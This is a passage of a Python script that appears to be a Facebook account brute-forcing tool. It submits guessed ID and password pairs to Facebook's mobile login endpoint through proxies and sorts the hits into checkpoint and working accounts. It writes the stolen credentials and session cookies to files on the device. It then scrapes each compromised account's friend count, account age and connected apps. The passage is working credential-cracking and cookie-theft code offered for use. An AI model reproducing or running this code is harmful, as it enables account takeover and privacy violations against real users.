			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'└── {idf}|{pw}'
					statuscp1 = nel(statuscp, style='bold red')
					cetak(nel(statuscp1, title='CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'└── {idf}|{pw}\n{kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					emhp=requests.get('https://mbasic.facebook.com/profile.php?v=info',cookies=coki,headers=headapp).text
					try:
						tems=session.get('https://mbasic.facebook.com/profile.php?id='+idf+'&v=friends',cookies=coki,headers=headapp).text
						teman=re.search('>Teman (.*?)<',str(tems)).groups(1)
						tem=teman[0].split('(')
						temm=tem[1].split(')')
						infoakun+= (f"[blue][•] TEMAN : {temm[0]}[/blue]\n")
					except:
						infoakun+= (f"[blue][•] TEMAN : - [/blue]\n")
					try:
						tahs=session.get('https://mbasic.facebook.com/'+idf+'/allactivity/?entry_point=settings_yfi&settings_tracking=mbasic_footer_link%3Asettings_2_0&privacy_source=your_facebook_information&_rdr',cookies=coki,headers=headapp).text
						tah=re.findall('id="year_(.*?)"',str(tahs))
						tahu=(len(tah)-1)
						tahun=tah[tahu]
						infoakun+= (f"[blue][•] TAHUN : {tahun} [/blue]\n")
					except:
						infoakun+= (f"[blue][•] TAHUN : -  [/blue]\n")


					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[blue][•] APLIKASI AKTIF :[/blue] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[cyan][{nok}] {muncul[0]} {muncul[1]}[/cyan]\n")
						nok+=1
						
					hit=0
					infoakun += (f"\n[blue][•] APLIKASI EXPIRED :[/blue]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[cyan][{hit}] {muncul[0]} {muncul[1]}[/cyan]\n")
					print('\n')
					statusok = f'[green][•] ID    : {idf}|{pw}\n{kuki}[/green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[green]OK[/green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('/sdcard/4MBF-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/4MBF-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/4MBF-DATA/DUMP')
	except:pass
	login()
